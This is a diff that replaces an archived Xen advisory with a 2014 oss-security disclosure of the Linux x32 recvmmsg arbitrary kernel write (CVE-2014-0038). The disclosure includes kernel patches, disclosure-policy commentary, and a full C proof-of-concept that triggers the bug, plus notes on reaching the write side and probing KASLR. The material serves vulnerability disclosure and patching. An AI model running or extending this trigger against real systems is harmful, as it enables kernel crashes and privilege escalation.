@@ -1,134 +1,318 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/05/01/13
-Message-Id: <E1WfodH-0004Jw-FC@xenbits.xen.org>
-Date: Thu, 01 May 2014 10:54:27 +0000
-From: Xen.org security team <security@....org>
-To: xen-announce@...ts.xen.org, xen-devel@...ts.xen.org, xen-users@...ts.xen.org, oss-security@...ts.openwall.com
-CC: Xen.org security team <security@....org>
-Subject: Xen Security Advisory 92 (CVE-2014-3124) - HVMOP_set_mem_type allows invalid P2M entries to be created
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/01/31/2
+Message-ID: <20140131001116.GA16906@openwall.com>
+Date: Fri, 31 Jan 2014 04:11:16 +0400
+From: Solar Designer <solar@...nwall.com>
+To: oss-security@...ts.openwall.com
+Subject: Linux 3.4+: arbitrary write with CONFIG_X86_X32 (CVE-2014-0038)
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+Hi,
 
-             Xen Security Advisory CVE-2014-3124 / XSA-92
-                              version 3
+This issue was brought to linux-distros and security@k.o 2 days ago via
+the message quoted below, and it was just made public at 22:00 UTC today
+(two hours ago) via grsecurity and PaX (who were the ones to find the
+issue).  Normally, the person who brought this to linux-distros would be
+the one responsible to bring the issue to oss-security as soon as the
+issue is public, but Kees does not appear to be around at the moment and
+the issue is critical enough that I find it inappropriate to delay this
+posting by a few hours more, hence I am doing Kees' job by posting this
+in here.
 
-      HVMOP_set_mem_type allows invalid P2M entries to be created
+This is CVE-2014-0038 (assigned shortly after Kees sent the message
+below).  I will also include PaX Team's revised patch below.
 
-UPDATES IN VERSION 3
-====================
+----- Forwarded message from Kees Cook <keescook@...omium.org> -----
 
-This issue has been assigned CVE-2014-3124.
+From: Kees Cook <keescook@...omium.org>
+Subject: 3.4+: arbitrary write with CONFIG_X86_X32
+Date: Tue, 28 Jan 2014 15:52:58 -0800
 
-ISSUE DESCRIPTION
-=================
+This appears to be a serious bug, so I'd like to make sure distros
+have time to prepare updates but PaX Team really wants to get this
+fixes ASAP. When is the soonest Coordinated Release Date distros can
+handle?
 
-The implementation in Xen of the HVMOP_set_mem_type HVM control
-operations attempts to exclude transitioning a page from an
-inappropriate memory type.  However, only an inadequate subset of
-memory types is excluded.
+(I have no CVE assigned for this since I'm still waiting for my 2014
+allocation.)
 
-There are certain other types that don't correspond to a particular
-valid page, whose page table translation can be inappropriately
-changed (by HVMOP_set_mem_type) from not-present (due to the lack of
-valid memory page) to present.  If this occurs, an invalid translation
-will be established.
+Reported by pageexec at
+https://code.google.com/p/chromium/issues/detail?id=338594, which is
+restricted, so here's the full report:
+----
+asmlinkage long compat_sys_recvmmsg(int fd, struct compat_mmsghdr __user *mmsg,
+                                    unsigned int vlen, unsigned int flags,
+                                    struct compat_timespec __user *timeout)
+{
+        int datagrams;
+        struct timespec ktspec;
 
-IMPACT
-======
+        if (flags & MSG_CMSG_COMPAT)
+                return -EINVAL;
 
-In a configuration where device models run with limited privilege (for
-example, stubdom device models), a guest attacker who successfully
-finds and exploits an unfixed security flaw in qemu-dm could leverage
-the other flaw into a Denial of Service affecting the whole host.
+        if (COMPAT_USE_64BIT_TIME)
+                return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
+                                      flags | MSG_CMSG_COMPAT,
+                                      (struct timespec *) timeout);
+/*...*/
 
-In the more general case, in more abstract terms: a malicious
-administrator of a domain privileged with regard to an HVM guest can
-cause Xen to crash leading to a Denial of Service.
+The timeout pointer parameter is provided by userland (hence the
+__user annotation) but for x32 syscalls it's simply cast to a kernel
+pointer and is passed to __sys_recvmmsg which will eventually directly
+dereference it for both reading and writing. Other callers to
+__sys_recvmmsg properly copy from userland to the kernel first.
 
-Arbitrary code execution, and therefore privilege escalation, cannot
-be entirely excluded: On a system with a RAM page present immediately
-below the 52-bit address boundary, this would be possible.  However,
-we are not aware of any systems with such a memory layout.
+The impact is a sort of arbitrary kernel write-where-what primitive by
+unprivileged users where the to-be-written area must contain valid
+timespec data initially (the first 64 bit long field must be positive
+and the second one must be < 1G).
 
-VULNERABLE SYSTEMS
-==================
+The bug was introduced by commit
+http://git.kernel.org/linus/ee4fa23c4b (other uses of
+COMPAT_USE_64BIT_TIME seem fine) and should affect all kernels since
+3.4 (and perhaps vendor kernels if they backported x32 support along
+with this code). Note that CONFIG_X86_X32_ABI gets enabled at build
+time and only if CONFIG_X86_X32 is enabled and ld can build x32
+executables.
 
-All Xen versions from 4.1 onwards are vulnerable.
+Suggested fix:
+Signed-off-by: PaX Team <pageexec@...email.hu>
 
-The vulnerability is only exposed to service domains for HVM guests
-which have privilege over the guest.  In a usual configuration that
-means only device model emulators (qemu-dm).
+--- a/net/compat.c  2014-01-20 12:36:54.372997752 +0100
++++ b/net/compat.c      2014-01-28 02:06:59.265506171 +0100
+@@ -780,22 +780,25 @@
+        if (flags & MSG_CMSG_COMPAT)
+                return -EINVAL;
 
-In the case of HVM guests whose device model is running in an
-unrestricted dom0 process, qemu-dm already has the ability to cause
-problems for the whole system.  So in that case the vulnerability is
-not applicable.
+-       if (COMPAT_USE_64BIT_TIME)
+-               return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
+-                                     flags | MSG_CMSG_COMPAT,
+-                                     (struct timespec *) timeout);
+-
+        if (timeout == NULL)
+                return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
+                                      flags | MSG_CMSG_COMPAT, NULL);
 
-The situation is more subtle for an HVM guest with a stub qemu-dm.
-That is, where the device model runs in a separate domain (in the case
-of xl, as requested by "device_model_stubdomain_override=1" in the xl
-domain configuration file).  The same applies with a qemu-dm in a dom0
-process subjected to some kind kernel-based process privilege
-limitation (eg the chroot technique as found in some versions of
-XCP/XenServer).
+-       if (get_compat_timespec(&ktspec, timeout))
++       if (COMPAT_USE_64BIT_TIME) {
++               if (copy_from_user(&ktspec, timeout, sizeof(ktspec)))
++                       return -EFAULT;
++       } else if (get_compat_timespec(&ktspec, timeout))
+                return -EFAULT;
 
-In those latter situations this issue means that the extra isolation
-does not provide as good a defence (against denial of service) as
-intended.  That is the essence of this vulnerability.
+        datagrams = __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
+                                   flags | MSG_CMSG_COMPAT, &ktspec);
+-       if (datagrams > 0 && put_compat_timespec(&ktspec, timeout))
+-               datagrams = -EFAULT;
++       if (datagrams > 0) {
++               if (COMPAT_USE_64BIT_TIME) {
++                       if (copy_to_user(timeout, &ktspec, sizeof(ktspec)))
++                               datagrams = -EFAULT;
++               } else if (put_compat_timespec(&ktspec, timeout))
++                       datagrams = -EFAULT;
++       }
 
-However, the security is still better than with a qemu-dm running as
-an unrestricted dom0 process.  Therefore users with these
-configurations should not switch to an unrestricted dom0 qemu-dm.
+        return datagrams;
+ }
 
-Finally, in a radically disaggregated system: where the HVM service
-domain software (probably, the device model domain image) is not
-always supplied by the host administrator, a malicious service domain
-administrator can exercise this vulnerability.
+So I couldn't help it and created a simple PoC trigger based on the
+example in the manpage. As it is, it'll just trigger a null-deref oops
+on the read side:
 
-MITIGATION
-==========
+BUG: unable to handle kernel NULL pointer dereference at 0000000000000009
+IP: [<ffffffff82a333cb>] __sys_recvmmsg+0x3b/0x310
 
-Running only PV guests will avoid this vulnerability.
+By passing an appropriate value for the timeout pointer one can
+trigger the write side too. By the way, this also allows scanning the
+kernel address space and even reveal KASLR (try every 2MB, if no oops
+-> found the kernel), no doubt to Kees' delight :).
 
-In a radically disaggregated system, restricting HVM service domains
-to software images approved by the host administrator will avoid the
-vulnerability.
+/*
+ * PoC trigger for the linux 3.4+ recvmmsg x32 compat bug, based on the manpage
+ *
+ * https://code.google.com/p/chromium/issues/detail?id=338594
+ *
+ * $ while true; do echo $RANDOM > /dev/udp/127.0.0.1/1234; sleep 0.25; done
+ */
 
-CREDITS
-=======
+#define _GNU_SOURCE
+#include <netinet/ip.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <unistd.h>
+#include <sys/syscall.h>
 
-This issue was discovered by Jan Beulich.
+#define __X32_SYSCALL_BIT 0x40000000
+#undef __NR_recvmmsg
+#define __NR_recvmmsg (__X32_SYSCALL_BIT + 537)
 
-RESOLUTION
-==========
+int
+main(void)
+{
+#define VLEN 10
+#define BUFSIZE 200
+#define TIMEOUT 1
+    int sockfd, retval, i;
+    struct sockaddr_in sa;
+    struct mmsghdr msgs[VLEN];
+    struct iovec iovecs[VLEN];
+    char bufs[VLEN][BUFSIZE+1];
+    struct timespec timeout;
 
-Applying the appropriate attached patch resolves this issue.
+    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sockfd == -1) {
+        perror("socket()");
+        exit(EXIT_FAILURE);
+    }
 
-xsa92.patch                 xen-unstable, Xen 4.4.x, Xen 4.3.x
-xsa92-4.2.patch             Xen 4.2.x
-xsa92-4.1.patch             Xen 4.1.x
+    sa.sin_family = AF_INET;
+    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+    sa.sin_port = htons(1234);
+    if (bind(sockfd, (struct sockaddr *) &sa, sizeof(sa)) == -1) {
+        perror("bind()");
+        exit(EXIT_FAILURE);
+    }
 
-$ sha256sum xsa92*.patch
-184dcb88dfb4540fca33016ffcfe0f4f557449ab5b4ec6a4bf486c75926d23f3  xsa92.patch
-76905398958dfcec98fb5bde2a68c0e86a3ccc9f442a8a658e972937fd75534a  xsa92-4.1.patch
-bca98827834f807c787fceb6c719d9d4fe3c40786cb087156829e5e6fb5700d6  xsa92-4.2.patch
-$
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.12 (GNU/Linux)
+    memset(msgs, 0, sizeof(msgs));
+    for (i = 0; i < VLEN; i++) {
+        iovecs[i].iov_base         = bufs[i];
+        iovecs[i].iov_len          = BUFSIZE;
+        msgs[i].msg_hdr.msg_iov    = &iovecs[i];
+        msgs[i].msg_hdr.msg_iovlen = 1;
+    }
 
-iQEcBAEBAgAGBQJTYidfAAoJEIP+FMlX6CvZ6m0H/0khx5ZZ0MiEf52szuhdBoCe
-zmNRuD8FrjS16CQx6KIUvvlLujWHg3hE+PFAoV3tM5U9++WrvXVO8o1ckKysle26
-udRignUc1Y+Am5nB1p1KRwpVb4v8votb+/GJfFlYd01V4wyaMttQLJkI9jcLRMN7
-f0bcttCZTTToQGpl6DuYh1NCOc1mLEtlC66SAHvvA8jC6K395M/MsSs+lkB63AHW
-SS2kdatHpt3BH4zSPRZQiwStMTCYMPN3+oc9BX1N1DphbqKo5yC1WaamF//24Ew9
-ZDjtBgjQhJfZ9IKPbRctsxKOrObEfkcLLO3ETaZ74MHl94I000L+lfki7D8Gk+k=
-=xTcW
------END PGP SIGNATURE-----
+    timeout.tv_sec = TIMEOUT;
+    timeout.tv_nsec = 0;
 
-Download attachment "xsa92.patch" of type "application/octet-stream" (1312 bytes)
+//    retval = recvmmsg(sockfd, msgs, VLEN, 0, &timeout);
+//    retval = syscall(__NR_recvmmsg, sockfd, msgs, VLEN, 0, &timeout);
+    retval = syscall(__NR_recvmmsg, sockfd, msgs, VLEN, 0, (void *)1ul);
+    if (retval == -1) {
+        perror("recvmmsg()");
+        exit(EXIT_FAILURE);
+    }
 
-Download attachment "xsa92-4.1.patch" of type "application/octet-stream" (2459 bytes)
+    printf("%d messages received\n", retval);
+    for (i = 0; i < retval; i++) {
+        bufs[i][msgs[i].msg_len] = 0;
+        printf("%d %s", i+1, bufs[i]);
+    }
+    exit(EXIT_SUCCESS);
+}
+----
 
-Download attachment "xsa92-4.2.patch" of type "application/octet-stream" (1313 bytes)
+-Kees
+
+-- 
+Kees Cook
+Chrome OS Security
+
+----- End forwarded message -----
+
+----- Forwarded message from PaX Team <pageexec@...email.hu> -----
+
+From: "PaX Team" <pageexec@...email.hu>
+Subject: Re: 3.4+: arbitrary write with CONFIG_X86_X32
+Date: Thu, 30 Jan 2014 14:45:53 +0100
+
+On 30 Jan 2014 at 14:24, security@...nel.org wrote:
+
+> On 29 Jan 2014 at 20:06, H. Peter Anvin wrote:
+> 
+> > Longer term we may want to do something fancier with
+> > get_compat_timespec() and put_compat_timespec() to encapsulate
+> > COMPAT_USE_64BIT_TIME, but this is not the time.
+> 
+> Yeah, I didn't go that route because these functions have a dozen
+> other callers (including gems like compat_get_timespec calling
+> get_compat_timespec where the former does treat x32) and I didn't
+> want to find out if all of them would need the x32 treatment when
+> fixing this bug is much more urgent.
+
+Actually, I think we can use compat_*_timespec here as I effectively
+ended up open coding them, so here's the new and simpler patch:
+
+Signed-off-by: PaX Team <pageexec@...email.hu>
+
+--- a/net/compat.c	2014-01-20 12:36:54.372997752 +0100
++++ b/net/compat.c	2014-01-30 14:29:15.385082301 +0100
+@@ -780,21 +780,16 @@
+ 	if (flags & MSG_CMSG_COMPAT)
+ 		return -EINVAL;
+ 
+-	if (COMPAT_USE_64BIT_TIME)
+-		return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
+-				      flags | MSG_CMSG_COMPAT,
+-				      (struct timespec *) timeout);
+-
+ 	if (timeout == NULL)
+ 		return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
+ 				      flags | MSG_CMSG_COMPAT, NULL);
+ 
+-	if (get_compat_timespec(&ktspec, timeout))
++	if (compat_get_timespec(&ktspec, timeout))
+ 		return -EFAULT;
+ 
+ 	datagrams = __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
+ 				   flags | MSG_CMSG_COMPAT, &ktspec);
+-	if (datagrams > 0 && put_compat_timespec(&ktspec, timeout))
++	if (datagrams > 0 && compat_put_timespec(&ktspec, timeout))
+ 		datagrams = -EFAULT;
+ 
+ 	return datagrams;
+
+----- End forwarded message -----
+
+Both patches were Acked-by: H. Peter Anvin <hpa@...ux.intel.com> (when
+each was the current patch), and I guess the newer patch (from the
+second forwarded message above) is preferable (the one I expect to see
+committed soon).
+
+It appears, from the linux-distros discussion, that a couple of distros
+are going to release emergency security updates for this.  If they did
+not express interest in an extra day of embargo, the issue would likely
+be made public on the first day (not on the second).
+
+In one of the messages on linux-distros, I commented on whether using
+the list for an issue like this was even appropriate, as follows:
+
+"BTW, if this were not limited to x32, I'd say that posting the info
+directly to linux-distros (rather than e.g. posting a "please contact me
+for details if affected and need more detail") would be inappropriate,
+because it's a high impact bug, whereas this list is for medium overall
+severity issues:
+
+http://oss-security.openwall.org/wiki/mailing-lists/distros
+
+"To report a non-public medium severity 1) security issue to one of
+these lists, send e-mail to distros [at] ..."
+
+"1) Medium overall severity as estimated by risk probability and risk
+impact product.  It is recommended that low severity security issues be
+reported to the public oss-security list right away, whereas high
+severity ones be reported to the affected vendors directly."
+
+It's the x32 aspect that reduces the overall severity in this case."
+
+Arbitrary selection of additional detail/commentary, from Twitter:
+
+During the first day (of two) of embargo of this vuln:
+
+<grsecurity> My hatred for embargoes and vendor-sec-like lists cannot be adequately expressed
+
+Right after the coordinated disclosure date/time (today):
+
+<grsecurity> If you're running Linux 3.4 or newer and enabled CONFIG_X86_X32 , you need to disable it or update immediately; upstream vuln CVE-2014-0038
+<grsecurity> It doesn't get any more serious, nearly an arbitrary write which nothing (including grsecurity) will prevent exploitation of
+<grsecurity> To give you an idea of the level of testing that went into X32 support, a syscall fuzzer trying random syscall numbers could have found this
+<grsecurity> Yet it sat in the kernel for over a year and a half
+<grsecurity> I would not be surprised to see an exploit for this within the next few days
+<@grsecurity> @awasi1001 Our latest test patch uploaded today contains the fix.  The stable 3.2 tree is not affected.
+
+<grsecurity> In case there's confusion, this vuln is not about 32bit userland on 64bit (CONFIG_X86_32), but the new X32 ABI.  Ubuntu enables it recently
+
+<djrbliss> Seems the X32 privesc (CVE-2014-0038) was introduced in the final five lines of this commit: http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/net/compat.c?id=ee4fa23c4bfcc635d077a9633d405610de45bc70
+
+Alexander
